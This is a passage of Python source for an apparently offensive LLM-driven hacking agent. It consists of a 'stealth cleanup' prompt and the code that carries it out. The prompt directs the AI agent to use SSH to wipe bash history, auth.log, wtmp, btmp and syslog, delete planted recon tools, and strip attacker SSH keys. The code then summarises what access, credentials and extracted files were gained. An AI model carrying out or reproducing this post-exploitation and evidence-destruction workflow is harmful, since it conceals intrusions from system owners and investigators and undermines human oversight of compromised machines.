## STEALTH CLEANUP (Stage 9) — When tasked with cleanup:
Run these commands via ssh_exec to remove ALL traces:
1. Clear bash history: [TOOL: ssh_exec IP USER PASS 'history -c; cat /dev/null > ~/.bash_history']
2. Clear auth logs: [TOOL: ssh_exec IP USER PASS 'cat /dev/null > /var/log/auth.log 2>/dev/null']
3. Clear wtmp/btmp: [TOOL: ssh_exec IP USER PASS 'cat /dev/null > /var/log/wtmp; cat /dev/null > /var/log/btmp']
4. Remove planted files: [TOOL: ssh_exec IP USER PASS 'rm -f /tmp/.octopus* /tmp/linpeas* /tmp/pspy*']
5. Clear syslog entries: [TOOL: ssh_exec IP USER PASS 'cat /dev/null > /var/log/syslog 2>/dev/null']
6. Remove added SSH keys: [TOOL: ssh_exec IP USER PASS 'sed -i "/octopus/d" ~/.ssh/authorized_keys 2>/dev/null']

## RULES
1. Run maximum 2-3 tools per task.
2. Use credentials from KNOWN CREDENTIALS exactly as shown. NEVER invent credentials.
3. Report: what access was gained, any new credentials, files extracted.
4. For CLEANUP: report what traces were successfully removed.
"""
        )

    def execute_task(self, target: str, task: str) -> str:
        creds_ctx = _build_creds_context(target)

        # Detect if this is a cleanup task
        is_cleanup = any(kw in task.lower() for kw in ["cleanup", "clean up", "remove traces",
                                                         "stealth", "evidence", "зачистка"])
        task_type = "stealth cleanup" if is_cleanup else "post-exploitation"

        # FIX: Check if the Director already embedded tool tags in the task
        embedded_tags = extract_tags(task)
        if embedded_tags:
            results = _run_tags_safe(embedded_tags, self.name, limit=4)
            if results.strip():
                if is_cleanup:
                    sum_prompt = (f"{creds_ctx}Target: {target}\n"
                                  f"Tool outputs:\n{results[:2500]}\n\n"
                                  f"Summarize: what traces were REMOVED? What remains? Status: SUCCESS/PARTIAL/FAILED.")
                else:
                    sum_prompt = (f"{creds_ctx}Target: {target}\n"
                                  f"Tool outputs:\n{results[:2500]}\n\n"
                                  f"Summarize post-exploitation results in 3-5 lines.")
                return self.query(sum_prompt)

        # No embedded tags — ask LLM to decide
        prompt = f"""{creds_ctx}Target: {target}
Task: {task}
Execute {task_type} (maximum 3 tools). {"Remove ALL forensic traces!" if is_cleanup else ""}"""

        response = self.query(prompt)
        tags = extract_tags(response)

        if not tags:
            return f"[PostExploit] No tools run. Analysis: {response[:500]}"

        results = _run_tags_safe(tags, self.name, limit=4)

        if is_cleanup:
            sum_prompt = f"Tool outputs:\n{results[:2500]}\n\nSummarize: what traces were REMOVED? What remains? Status: SUCCESS/PARTIAL/FAILED."
        else:
            sum_prompt = f"Tool outputs:\n{results[:2500]}\n\nSummarize post-exploitation results in 3-5 lines."
        return self.query(sum_prompt)

